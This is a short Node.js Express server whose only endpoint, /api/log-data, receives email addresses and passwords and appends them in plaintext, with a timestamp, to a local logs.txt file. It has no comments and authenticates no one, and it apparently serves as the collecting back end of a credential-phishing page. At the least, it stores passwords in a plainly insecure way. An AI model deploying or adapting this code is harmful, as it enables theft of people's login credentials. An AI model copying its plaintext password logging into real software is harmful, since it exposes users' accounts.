const express = require("express");
const fs = require("fs");
const path = require("path");
const app = express();

app.use(express.json());

app.post("/api/log-data", (req, res) => {
    const { email, password, timestamp } = req.body;

    if (!email || !password) {
        return res.status(400).json({ success: false, message: "Missing email or password" });
    }

    const logData = `Email: ${email}, Password: ${password}, Timestamp: ${timestamp}\n`;

    fs.appendFile(path.join(__dirname, "logs.txt"), logData, (err) => {
        if (err) {
            console.error("Error writing to log file:", err);
            return res.status(500).json({ success: false, message: "Internal server error" });
        }

        res.status(200).json({ success: true, message: "Data logged successfully" });
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
